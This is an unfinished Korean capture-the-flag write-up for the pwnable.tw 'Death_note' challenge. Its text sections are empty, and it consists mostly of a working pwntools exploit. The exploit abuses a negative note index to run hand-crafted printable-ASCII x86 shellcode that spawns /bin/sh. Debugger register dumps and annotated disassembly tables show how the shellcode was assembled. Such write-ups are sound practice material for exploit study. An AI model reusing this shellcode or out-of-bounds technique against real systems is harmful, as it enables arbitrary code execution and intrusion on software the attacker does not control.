---
title: Pwnable.tw - Death_note
categories:
 - pwnable
tags: shellcode, oob, fastbin, pwnable.tw
---

- Introduction
- Vunlnerability
- Exploit
- slv.py
- 느낀 점
- Reference


## Introduction

포스팅 중..(20.07.15)

## Vunlnerability


## Exploit

```
glibc 2.27
[----------------------------------registers-----------------------------------]
EAX: 0x804b160 ("aaaaaaa")
EBX: 0x0 
ECX: 0x1 
EDX: 0x0 
ESI: 0xf7fc3000 --> 0x1d7d6c 
EDI: 0x0 
EBP: 0xffffd3f8 --> 0xffffd408 --> 0x0 
ESP: 0xffffd3cc --> 0x8048878 (<del_note+81>:   add    esp,0x10)
EIP: 0x804b160 ("aaaaaaa")
EFLAGS: 0x296 (carry PARITY ADJUST zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]

glibc 2.23

[----------------------------------registers-----------------------------------]
EAX: 0x818b008 ("PWW^X_Ph//shh/binT[PSTY,E$KPVX^-~../5OQA@PVX^W\\", '_' <repeats 18 times>, "V", 'M' <repeats 14 times>)
EBX: 0x0
ECX: 0x0
EDX: 0x0
ESI: 0xf774b000 --> 0x1b2db0
EDI: 0xf774b000 --> 0x1b2db0
EBP: 0xffcc0e68 --> 0xffcc0e78 --> 0x0
ESP: 0xffcc0e3c --> 0x8048878 (<del_note+81>:   add    esp,0x10)
EIP: 0x818b008 ("PWW^X_Ph//shh/binT[PSTY,E$KPVX^-~../5OQA@PVX^W\\", '_' <repeats 18 times>, "V", 'M' <repeats 14 times>)
EFLAGS: 0x296 (carry PARITY ADJUST zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]

```



## slv.py
```python
from pwn import *

#p = process('./death_note')
p = remote('chall.pwnable.tw', 10201)

#context.terminal = ['/usr/bin/tmux', 'splitw', '-h']
#context.log_level = 'debug'

script = '''
b* is_printable
b* 0x8048490
'''

sla = lambda s,c : p.sendlineafter(s, str(c))
sa = lambda s,c : p.sendafter(s, str(c))
s = lambda s : p.send(s)




def add_note(index, name):
    
    sa(':', 1)
    sa(':', index)
    sa(':', name)
    
    return


def show_note(index):
    
    sa(':', 2)
    sa(':', index)
    
    return


def delete_note(index):
    
    sa(':', 3)
    sa(':', index)
    
    return


def Exit():
    
    sa(':', 4)

    return




def main():
    
    #gdb.attach(p, script)
    
    payload = '''
            push eax
            push ebx
            push ebx
            pop esi
            pop eax
            pop edi
            
            push eax
            push   0x68732f2f
            push   0x6e69622f
            
            push esp
            pop ebx
            
            push eax
            push ebx
            push esp
            pop ecx
            
            sub al,0x45
            and al,0x4b
            push eax
            push esi
            pop eax
            pop esi
            
            sub    eax,0x2f2e2e7e 
            xor    eax,0x4041514f
            
            push   eax
            push esi
            pop eax
            pop esi
            push edi
            pop esp
            pop    edi
            pop    edi
            pop    edi
            pop    edi
            pop    edi
            pop    edi
            pop    edi
            pop    edi
            pop    edi
            pop    edi
            pop    edi
            pop    edi
            pop    edi
            pop    edi
            pop    edi
            pop    edi
            pop    edi
            pop    edi
            push   esi
            
    '''
        
    #payload = ''
    #payload += '\x50\x57\x57\x5e\x58\x5f\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x54\x5b\x50\x53\x54\x59\x2c\x45\x24\x4b\x50\x56\x58\x5e\x2d\x7e\x2e\x2e\x2f\x35\x4f\x51\x41\x40\x50\x56\x58\x5e\x57\x5c\x5f\x5f\x5f\x5f\x5f\x5f\x5f\x5f\x5f\x5f\x5f\x5f\x5f\x5f\x5f\x5f\x5f\x5f\x56'
    
    payload = asm(payload)
    log.info('payload length : ' + hex(len(payload)))
    payload += '\x4d'*(0x50-len(payload))
    
    
    add_note(-19, payload)
    delete_note(-19)
    p.interactive()
    
    
    return




if __name__ == '__main__':
    
    main()
    
    
'''


0:  31 c0                   xor    eax,eax     -
2:  50                      push   eax         +
3:  68 2f 2f 73 68          push   0x68732f2f  +
8:  68 2f 62 69 6e          push   0x6e69622f  +
d:  89 e3                   mov    ebx,esp     -
f:  50                      push   eax         +
10: 53                      push   ebx         +
11: 89 e1                   mov    ecx,esp     -
13: b0 0b                   mov    al,0xb      -
15: cd 80                   int    0x80        -



#### Alpha-Numeric shellcode START ####




[----------------------------------registers-----------------------------------]
EAX: 0x804b160 ("aaaaaaa")
EBX: 0x0 
ECX: 0x1 
EDX: 0x0 
ESI: 0xf7fc3000 --> 0x1d7d6c 
EDI: 0x0 
EBP: 0xffffd3f8 --> 0xffffd408 --> 0x0 
ESP: 0xffffd3cc --> 0x8048878 (<del_note+81>:   add    esp,0x10)
EIP: 0x804b160 ("aaaaaaa")
EFLAGS: 0x296 (carry PARITY ADJUST zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x804b15a:   add    BYTE PTR [eax],al
   0x804b15c:   adc    DWORD PTR [eax],eax
   0x804b15e:   add    BYTE PTR [eax],al
=> 0x804b160:   popa   
   0x804b161:   popa   
   0x804b162:   popa   
   0x804b163:   popa   
   0x804b164:   popa
[------------------------------------stack-------------------------------------]
0000| 0xffffd3cc --> 0x8048878 (<del_note+81>:  add    esp,0x10)
0004| 0xffffd3d0 --> 0x804b160 ("aaaaaaa")
0008| 0xffffd3d4 --> 0x2 
0012| 0xffffd3d8 --> 0xffffd3f8 --> 0xffffd408 --> 0x0 
0016| 0xffffd3dc --> 0x8048842 (<del_note+27>:  mov    DWORD PTR [ebp-0xc],eax)
0020| 0xffffd3e0 --> 0x8048be4 ("Your choice :")
0024| 0xffffd3e4 --> 0x0 
0028| 0xffffd3e8 --> 0xffffd408 --> 0x0 
[------------------------------------------------------------------------------]

#0:  31 c0                   xor    eax,eax     -

61: 50                      push   eax
6e: 57                      push   edi
6e: 57                      push   edi
7c: 5e                      pop    esi           esi = 0
70: 58                      pop    eax
7e: 5f                      pop    edi           edi = heap_addr
2:  50                      push   eax         + eax = 0
3:  68 2f 2f 73 68          push   0x68732f2f  +
8:  68 2f 62 69 6e          push   0x6e69622f  +
## d:  89 e3                   mov    ebx,esp     -
68: 54                      push   esp
76: 5b                      pop    ebx          ebx = "/bin//sh"
f:  50                      push   eax         +
10: 53                      push   ebx         +
## 11: 89 e1                   mov    ecx,esp     -
68: 54                      push   esp
73: 59                      pop    ecx          ecx = *["/bin//sh"]
## 13: b0 0b                   mov    al,0xb      -


18: 2c 45                   sub    al,0x45
8:  24 4b                   and    al,0x4b      eax = 0xb
60: 50                      push   eax
6c: 56                      push   esi
70: 58                      pop    eax          eax = 0
7d: 5e                      pop    esi          esi = 0xb


1a: 2d 7e 2e 2e 2f          sub    eax,0x2f2e2e7e 
0:  35 4f 51 41 40          xor    eax,0x40415140

61: 50                      push   eax          eax = 0x909080cd
6c: 56                      push   esi
70: 58                      pop    eax          eax = 0xb
7c: 5e                      pop    esi          esi = 0x909080cd
6f: 57                      push   edi
79: 5c                      pop    esp
7e: 5f                      pop    edi
7e: 5f                      pop    edi
7e: 5f                      pop    edi
7e: 5f                      pop    edi
7e: 5f                      pop    edi
7e: 5f                      pop    edi
7e: 5f                      pop    edi
7e: 5f                      pop    edi
7e: 5f                      pop    edi
7e: 5f                      pop    edi
7e: 5f                      pop    edi
7e: 5f                      pop    edi
7e: 5f                      pop    edi


6c: 56                      push   esi

-






















#0:  31 c0                   xor    eax,eax     -

8:  24 30                   and    al,0x30
2:  50                      push   eax         + eax = 0
3:  68 2f 2f 73 68          push   0x68732f2f  +
8:  68 2f 62 69 6e          push   0x6e69622f  +
#d:  89 e3                   mov    ebx,esp     -
68: 54                      push   esp
76: 5b                      pop    ebx          ebx = "/bin//sh"
f:  50                      push   eax         +
10: 53                      push   ebx         +
#11: 89 e1                   mov    ecx,esp     -
68: 54                      push   esp
73: 59                      pop    ecx          ecx = *["/bin//sh"]
#13: b0 0b                   mov    al,0xb      -
18: 2c 45                   sub    al,0x45
8:  24 4b                   and    al,0x4b      eax = 0xb
15: cd 80                   int    0x80        -






#### Alpha-Numeric shellcode END ####







0:  20 20                   and    BYTE PTR [eax],ah
2:  21 21                   and    DWORD PTR [ecx],esp
4:  22 22                   and    ah,BYTE PTR [edx]
6:  23 23                   and    esp,DWORD PTR [ebx]
8:  24 24                   and    al,0x24
a:  25 25 26 26 27          and    eax,0x27262625
f:  27                      daa
10: 28 28                   sub    BYTE PTR [eax],ch
12: 29 29                   sub    DWORD PTR [ecx],ebp
14: 2a 2a                   sub    ch,BYTE PTR [edx]
16: 2b 2b                   sub    ebp,DWORD PTR [ebx]
18: 2c 2c                   sub    al,0x2c
1a: 2d 2d 2e 2e 2f          sub    eax,0x2f2e2e2d
1f: 2f                      das
20: 30 30                   xor    BYTE PTR [eax],dh
22: 31 31                   xor    DWORD PTR [ecx],esi
24: 32 32                   xor    dh,BYTE PTR [edx]
26: 33 33                   xor    esi,DWORD PTR [ebx]
28: 34 34                   xor    al,0x34
2a: 35 35 36 36 37          xor    eax,0x37363635
2f: 37                      aaa
30: 38 38                   cmp    BYTE PTR [eax],bh
32: 39 39                   cmp    DWORD PTR [ecx],edi
34: 3a 3a                   cmp    bh,BYTE PTR [edx]
36: 3b 3b                   cmp    edi,DWORD PTR [ebx]
38: 3c 3c                   cmp    al,0x3c
3a: 3d 3d 3e 3e 3f          cmp    eax,0x3f3e3e3d
3f: 3f                      aas
40: 40                      inc    eax
41: 40                      inc    eax
42: 41                      inc    ecx
43: 41                      inc    ecx
44: 42                      inc    edx
45: 42                      inc    edx
46: 43                      inc    ebx
47: 43                      inc    ebx
48: 44                      inc    esp
49: 44                      inc    esp
4a: 45                      inc    ebp
4b: 45                      inc    ebp
4c: 46                      inc    esi
4d: 46                      inc    esi
4e: 47                      inc    edi
4f: 47                      inc    edi
50: 48                      dec    eax
51: 48                      dec    eax
52: 49                      dec    ecx
53: 49                      dec    ecx
54: 4a                      dec    edx
55: 4a                      dec    edx
56: 4b                      dec    ebx
57: 4b                      dec    ebx
58: 4c                      dec    esp
59: 4c                      dec    esp
5a: 4d                      dec    ebp
5b: 4d                      dec    ebp
5c: 4e                      dec    esi
5d: 4e                      dec    esi
5e: 4f                      dec    edi
5f: 4f                      dec    edi
60: 50                      push   eax
61: 50                      push   eax
62: 51                      push   ecx
63: 51                      push   ecx
64: 52                      push   edx
65: 52                      push   edx
66: 53                      push   ebx
67: 53                      push   ebx
68: 54                      push   esp
69: 54                      push   esp
6a: 55                      push   ebp
6b: 55                      push   ebp
6c: 56                      push   esi
6d: 56                      push   esi
6e: 57                      push   edi
6f: 57                      push   edi
70: 58                      pop    eax
71: 58                      pop    eax
72: 59                      pop    ecx
73: 59                      pop    ecx
74: 5a                      pop    edx
75: 5a                      pop    edx
76: 5b                      pop    ebx
77: 5b                      pop    ebx
78: 5c                      pop    esp
79: 5c                      pop    esp
7a: 5d                      pop    ebp
7b: 5d                      pop    ebp
7c: 5e                      pop    esi
7d: 5e                      pop    esi
7e: 5f                      pop    edi
7f: 5f                      pop    edi
80: 60                      pusha
81: 60                      pusha
82: 61                      popa
83: 61                      popa
84: 62 62 63                bound  esp,QWORD PTR [edx+0x63]
87: 63 64 64 65             arpl   WORD PTR [esp+eiz*2+0x65],sp
8b: 65 66 66 67 67 68 68    gs data16 addr16 addr16 pushw 0x6968
92: 69
93: 69 6a 6a 6b 6b 6c 6c    imul   ebp,DWORD PTR [edx+0x6a],0x6c6c6b6b
9a: 6d                      ins    DWORD PTR es:[edi],dx
9b: 6d                      ins    DWORD PTR es:[edi],dx
9c: 6e                      outs   dx,BYTE PTR ds:[esi]
9d: 6e                      outs   dx,BYTE PTR ds:[esi]
9e: 6f                      outs   dx,DWORD PTR ds:[esi]
9f: 6f                      outs   dx,DWORD PTR ds:[esi]
a0: 70 70                   jo     0x112
a2: 71 71                   jno    0x115
a4: 72 72                   jb     0x118
a6: 73 73                   jae    0x11b
a8: 74 74                   je     0x11e
aa: 75 75                   jne    0x121
ac: 76 76                   jbe    0x124
ae: 77 77                   ja     0x127
b0: 78 78                   js     0x12a
b2: 79 79                   jns    0x12d
b4: 7a 7a                   jp     0x130
b6: 7b 7b                   jnp    0x133
b8: 7c 7c                   jl     0x136
ba: 7d 7d                   jge    0x139
bc: 7e 7e                   jle    0x13c

http://ref.x86asm.net/coder32.html
https://defuse.ca/online-x86-assembler.htm#disassembly
'''
```

## 느낀 점


## Reference
